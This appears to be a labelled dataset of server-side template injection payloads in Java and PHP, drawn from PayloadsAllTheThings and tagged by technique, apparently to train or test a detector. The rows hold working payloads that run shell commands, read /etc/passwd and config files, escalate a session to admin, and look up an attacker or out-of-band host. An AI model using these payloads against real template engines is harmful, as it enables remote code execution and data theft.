{{ request }} would return a request object like com.[...].context.TemplateContextRequest@23548206,{{request}}wouldreturnarequestobjectlikecom.[...].context.templatecontextrequest@N,java,unknown,1,low,enumeration,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
{% set cmd = 'id' %},{%setcmd='S'%},java,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
{% set bytes = (1).TYPE,{%setbytes=(N).type,java,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
{{ (1).TYPE,{{(N).type,java,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
.newInstance(([bytes]).toArray()) }},.newinstance(([bytes]).toarray())}},java,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"#set($ex=$class.inspect(""java.lang.Runtime"").type.getRuntime().exec(""whoami""))","#set($ex=$class.inspect(""S"").type.getruntime().exec(""S""))",java,unknown,1,low,introspection,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
#set($out=$ex.getInputStream()),#set($out=$ex.getinputstream()),java,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
#foreach($i in [1..$out.available()]),#foreach($iin[N..$out.available()]),java,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
#set($base64EncodedCommand = 'd2hvYW1p'),#set($baseNencodedcommand='S'),java,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
#set($contextObjectClass = $knownContextObject.getClass()),#set($contextobjectclass=$knowncontextobject.getclass()),java,unknown,1,low,introspection,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"#set($Base64Class = $contextObjectClass.forName(""java.util.Base64""))","#set($baseNclass=$contextobjectclass.forname(""S""))",java,unknown,1,low,introspection,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"#set($Base64Decoder = $Base64Class.getMethod(""getDecoder"").invoke(null))","#set($baseNdecoder=$baseNclass.getmethod(""S"").invoke(null))",java,unknown,1,low,introspection,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
#set($decodedBytes = $Base64Decoder.decode($base64EncodedCommand)),#set($decodedbytes=$baseNdecoder.decode($baseNencodedcommand)),java,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"#set($StringClass = $contextObjectClass.forName(""java.lang.String""))","#set($stringclass=$contextobjectclass.forname(""S""))",java,unknown,1,low,introspection,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"#set($command = $StringClass.getConstructor($contextObjectClass.forName(""[B""), $contextObjectClass.forName(""java.lang.String"")).newInstance($decodedBytes, ""UTF-8""))","#set($command=$stringclass.getconstructor($contextobjectclass.forname(""S""),$contextobjectclass.forname(""S"")).newinstance($decodedbytes,""S""))",java,unknown,1,low,introspection,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"#set($commandArgs = [""/bin/sh"", ""-c"", $command])","#set($commandargs=[""S"",""S"",$command])",java,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"#set($ProcessBuilderClass = $contextObjectClass.forName(""java.lang.ProcessBuilder""))","#set($processbuilderclass=$contextobjectclass.forname(""S""))",java,unknown,1,low,introspection,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"#set($processBuilder = $ProcessBuilderClass.getConstructor($contextObjectClass.forName(""java.util.List"")).newInstance($commandArgs))","#set($processbuilder=$processbuilderclass.getconstructor($contextobjectclass.forname(""S"")).newinstance($commandargs))",java,unknown,1,low,introspection,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
#set($processBuilder = $processBuilder.redirectErrorStream(true)),#set($processbuilder=$processbuilder.redirecterrorstream(true)),java,unknown,1,low,direct-execution,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
#set($process = $processBuilder.start()),#set($process=$processbuilder.start()),java,unknown,1,low,direct-execution,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
#set($exitCode = $process.waitFor()),#set($exitcode=$process.waitfor()),java,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
#set($inputStream = $process.getInputStream()),#set($inputstream=$process.getinputstream()),java,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"#set($ScannerClass = $contextObjectClass.forName(""java.util.Scanner""))","#set($scannerclass=$contextobjectclass.forname(""S""))",java,unknown,1,low,introspection,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"#set($scanner = $ScannerClass.getConstructor($contextObjectClass.forName(""java.io.InputStream"")).newInstance($inputStream))","#set($scanner=$scannerclass.getconstructor($contextobjectclass.forname(""S"")).newinstance($inputstream))",java,unknown,1,low,introspection,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"#set($scannerDelimiter = $scanner.useDelimiter(""\\A""))","#set($scannerdelimiter=$scanner.usedelimiter(""S""))",java,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
#set($output = $scanner.next().trim()),#set($output=$scanner.next().trim()),java,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"#set($sc=$s.getClass().getConstructor($s.getClass().forName(""[B""), $s.getClass()))","#set($sc=$s.getclass().getconstructor($s.getclass().forname(""S""),$s.getclass()))",java,unknown,1,low,introspection,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"#set($p=$s.getClass().forName(""java.lang.Runtime"").getRuntime().exec(""id"")","#set($p=$s.getclass().forname(""S"").getruntime().exec(""S"")",java,unknown,1,low,introspection,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
#set($n=$p.waitFor()),#set($n=$p.waitfor()),java,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"#set($b=""Y:/A:/""+$sc.newInstance($p.inputStream.readAllBytes(), ""UTF-8""))","#set($b=""S""+$sc.newinstance($p.inputstream.readallbytes(),""S""))",java,unknown,1,low,uncertain,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"#set($p=$s.getClass().forName(""java.lang.Runtime"").getRuntime().exec(""id""))","#set($p=$s.getclass().forname(""S"").getruntime().exec(""S""))",java,unknown,1,low,introspection,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
#set($r=$p.exitValue()),#set($r=$p.exitvalue()),java,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"#set($t=$s.getClass().forName(""java.lang.Thread"").sleep(5000))","#set($t=$s.getclass().forname(""S"").sleep(N))",java,unknown,1,low,introspection,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
${String x = new File('c:/windows/notepad.exe').text},${stringx=newfile('S').text},java,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
${String x = new File('/path/to/file').getText('UTF-8')},${stringx=newfile('S').gettext('S')},java,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"${new File(""C:\Temp\FileName.txt"").createNewFile();}","${newfile(""S"").createnewfile();}",java,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"${""http://www.google.com"".toURL().text}","${""S"".tourl().text}",java,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"${new URL(""http://www.google.com"").getText()}","${newurl(""S"").gettext()}",java,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"${""calc.exe"".exec()}","${""S"".exec()}",java,unknown,1,low,direct-execution,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"${""calc.exe"".execute()}","${""S"".execute()}",java,unknown,1,low,direct-execution,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"${this.evaluate(""9*9"") //(this is a Script class)}","${this.evaluate(""S"")//(thisisascriptclass)}",java,unknown,1,low,probe,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"${new org.codehaus.groovy.runtime.MethodClosure(""calc.exe"",""execute"").call()}","${neworg.codehaus.groovy.runtime.methodclosure(""S"",""S"").call()}",java,unknown,1,low,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"${x=new/**/String();for(i/**/in[105,100]){x+=((char)i).toString()};x.execute().text}${x=new/**/String();for(i/**/in[105,100]){x+=((char)i).toString()};x.execute().text}","${x=new/**/string();for(i/**/in[N,N]){x+=((char)i).tostring()};x.execute().text}${x=new/**/string();for(i/**/in[N,N]){x+=((char)i).tostring()};x.execute().text}",java,unknown,1,low,direct-execution,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"${ @ASTTest(value={assert java.lang.Runtime.getRuntime().exec(""whoami"")})","${@asttest(value={assertjava.lang.runtime.getruntime().exec(""S"")})",java,unknown,1,low,direct-execution,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"${ new groovy.lang.GroovyClassLoader().parseClass(""@groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\""calc.exe\"")})def x"") }","${newgroovy.lang.groovyclassloader().parseclass(""S""calc.exe\""S"")}",java,unknown,1,low,direct-execution,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"${'patt'.toString().replace('a', 'x')}","${'S'.tostring().replace('S','S')}",java,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
${T(java.lang.Integer).valueOf('1')},${t(java.lang.integer).valueof('S')},java,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"${"""".getClass().forName(""java.net.InetAddress"").getMethod(""getByName"","""".getClass()).invoke("""",""[ATTACKER.DOMAIN.TLD]"")}","${""S"".getclass().forname(""S"").getmethod(""S"",""S"".getclass()).invoke(""S"",""S"")}",java,unknown,1,low,introspection,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"${pageContext.request.getSession().setAttribute(""admin"",true)}","${pagecontext.request.getsession().setattribute(""S"",true)}",java,unknown,1,low,enumeration,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"${T(java.lang.Runtime).getRuntime().exec(""whoami"")}","${t(java.lang.runtime).getruntime().exec(""S"")}",java,unknown,1,low,direct-execution,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"#{session.setAttribute(""rtc"","""".getClass().forName(""java.lang.Runtime"").getDeclaredConstructors()[0])}","#{session.setattribute(""S"",""S"".getclass().forname(""S"").getdeclaredconstructors()[N])}",java,unknown,1,low,introspection,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"#{session.getAttribute(""rtc"").setAccessible(true)}","#{session.getattribute(""S"").setaccessible(true)}",java,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"#{session.getAttribute(""rtc"").getRuntime().exec(""/bin/bash -c whoami"")}","#{session.getattribute(""S"").getruntime().exec(""S"")}",java,unknown,1,low,direct-execution,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
${''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(''.getClass().forName('java.lang.Runtime')).exec('whoami')},${'S'.getclass().forname('S').getmethods()[N].invoke('S'.getclass().forname('S')).exec('S')},java,unknown,1,low,introspection,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"${request.getClass().forName(""javax.script.ScriptEngineManager"").newInstance().getEngineByName(""js"").eval(""java.lang.Runtime.getRuntime().exec(\\\""whoami\\\"")""))}","${request.getclass().forname(""S"").newinstance().getenginebyname(""S"").eval(""S""whoami\\\""S""))}",java,unknown,1,low,introspection,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"${request.setAttribute(""c"","""".getClass().forName(""java.util.ArrayList"").newInstance())}","${request.setattribute(""S"",""S"".getclass().forname(""S"").newinstance())}",java,unknown,1,low,introspection,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"${request.getAttribute(""c"").add(""cmd.exe"")}","${request.getattribute(""S"").add(""S"")}",java,unknown,1,low,enumeration,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"${request.getAttribute(""c"").add(""/k"")}","${request.getattribute(""S"").add(""S"")}",java,unknown,1,low,enumeration,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"${request.getAttribute(""c"").add(""whoami"")}","${request.getattribute(""S"").add(""S"")}",java,unknown,1,low,enumeration,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"${request.setAttribute(""a"","""".getClass().forName(""java.lang.ProcessBuilder"").getDeclaredConstructors()[0].newInstance(request.getAttribute(""c"")).start())}","${request.setattribute(""S"",""S"".getclass().forname(""S"").getdeclaredconstructors()[N].newinstance(request.getattribute(""S"")).start())}",java,unknown,1,low,introspection,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"${request.getAttribute(""a"")}","${request.getattribute(""S"")}",java,unknown,1,low,enumeration,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"${T(java.lang.Integer).valueOf(""x""+T(java.lang.String).getConstructor(T(byte[])).newInstance(T(java.lang.Runtime).getRuntime().exec(""id"").inputStream.readAllBytes()))}","${t(java.lang.integer).valueof(""S""+t(java.lang.string).getconstructor(t(byte[])).newinstance(t(java.lang.runtime).getruntime().exec(""S"").inputstream.readallbytes()))}",java,unknown,1,low,direct-execution,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"${1/((T(java.lang.Runtime).getRuntime().exec(""id"").waitFor()==0)?1:0)+""""}","${N/((t(java.lang.runtime).getruntime().exec(""S"").waitfor()==N)?N:N)+""S""}",java,unknown,1,low,direct-execution,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"${(T(java.lang.Runtime).getRuntime().exec(""id"").waitFor().equals(0)?T(java.lang.Thread).sleep(5000):0).toString()}","${(t(java.lang.runtime).getruntime().exec(""S"").waitfor().equals(N)?t(java.lang.thread).sleep(N):N).tostring()}",java,unknown,1,low,direct-execution,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"{{passthru(implode(null,array_map(chr(99).chr(104).chr(114),[105,100])))}}","{{passthru(implode(null,array_map(chr(N).chr(N).chr(N),[N,N])))}}",php,unknown,1,low,direct-execution,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
{php}echo `id`;{/php} //deprecated in smarty v3,{php}echo`id`;{/php}//deprecatedinsmartyvN,php,unknown,1,low,direct-execution,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
"{system('ls')} // compatible v3, deprecated in v5","{system('S')}//compatiblevN,deprecatedinvN",php,unknown,1,low,direct-execution,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
"{system('cat index.php')} // compatible v3, deprecated in v5","{system('S')}//compatiblevN,deprecatedinvN",php,unknown,1,low,direct-execution,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
"{{passthru(implode(Null,array_map(chr(99)|cat:chr(104)|cat:chr(114),[105,100])))}}","{{passthru(implode(null,array_map(chr(N)|cat:chr(N)|cat:chr(N),[N,N])))}}",php,unknown,1,low,direct-execution,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
{{7*'7'}} would result in 49,{{N*'S'}}wouldresultinN,php,unknown,1,low,probe,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
"""Dear {first_name}"",","""S"",",php,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
"""{{'/etc/passwd'|file_excerpt(1,30)}}""@","""S""@",php,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
"{{include(""wp-config.php"")}}","{{include(""S"")}}",php,unknown,1,low,enumeration,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
"{{_self.env.registerUndefinedFilterCallback(""exec"")}}{{_self.env.getFilter(""id"")}}","{{_self.env.registerundefinedfiltercallback(""S"")}}{{_self.env.getfilter(""S"")}}",php,unknown,1,low,direct-execution,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
"{{[0]|reduce('system','id')}}","{{[N]|reduce('S','S')}}",php,unknown,1,low,feature-abuse,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
{{['id']|map('system')|join}},{{['S']|map('S')|join}},php,unknown,1,low,feature-abuse,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
"{{['id',1]|sort('system')|join}}","{{['S',N]|sort('S')|join}}",php,unknown,1,low,feature-abuse,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
{{['id']|filter('passthru')}},{{['S']|filter('S')}},php,unknown,1,low,direct-execution,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
{{['id']|map('passthru')}},{{['S']|map('S')}},php,unknown,1,low,direct-execution,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
{{['nslookup oastify.com']|filter('system')}},{{['S']|filter('S')}},php,unknown,1,low,feature-abuse,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
"{% for a in [""error_reporting"", ""1""]|sort(""ini_set"") %}{% endfor %} // Enable verbose error output for Error-Based","{%forain[""S"",""S""]|sort(""S"")%}{%endfor%}//enableverboseerroroutputforerror-based",php,unknown,1,low,feature-abuse,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
"{{_self.env.registerUndefinedFilterCallback(""shell_exec"")}}{%include [""Y:/A:/"", _self.env.getFilter(""id"")]|join%} // Error-Based RCE <= 1.19","{{_self.env.registerundefinedfiltercallback(""S"")}}{%include[""S"",_self.env.getfilter(""S"")]|join%}//error-basedrce<=N.N",php,unknown,1,low,direct-execution,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
"{{[0]|map([""xx"", {""id"": ""shell_exec""}|map(""call_user_func"")|join]|join)}} // Error-Based RCE >=1.41, >=2.10, >=3.0","{{[N]|map([""S"",{""S"":""S""}|map(""S"")|join]|join)}}//error-basedrce>=N.N,>=N.N,>=N.N",php,unknown,1,low,direct-execution,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
"{{_self.env.registerUndefinedFilterCallback(""shell_exec"")}}{{1/(_self.env.getFilter(""id && echo UniqueString"")|trim('\n') ends with ""UniqueString"")}} // Boolean-Based RCE <= 1.19","{{_self.env.registerundefinedfiltercallback(""S"")}}{{N/(_self.env.getfilter(""S"")|trim('S')endswith""S"")}}//boolean-basedrce<=N.N",php,unknown,1,low,direct-execution,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
"{{1/({""id && echo UniqueString"":""shell_exec""}|map(""call_user_func"")|join|trim('\n') ends with ""UniqueString"")}} // Boolean-Based RCE >=1.41, >=2.10, >=3.0","{{N/({""S"":""S""}|map(""S"")|join|trim('S')endswith""S"")}}//boolean-basedrce>=N.N,>=N.N,>=N.N",php,unknown,1,low,direct-execution,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
"{% set a = [""error_reporting"", ""1""]|sort(""ini_set"") %}{% set b = [""ob_start"", ""call_user_func""]|sort(""call_user_func"") %}{{ [""id"", 0]|sort(""system"") }}{% set a = [""ob_end_flush"", []]|sort(""call_user_func_array"")%} // Error-Based RCE with sandbox bypass using CVE-2022-23614","{%seta=[""S"",""S""]|sort(""S"")%}{%setb=[""S"",""S""]|sort(""S"")%}{{[""S"",N]|sort(""S"")}}{%seta=[""S"",[]]|sort(""S"")%}//error-basedrcewithsandboxbypassusingcve-N-N",php,unknown,1,low,probe,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
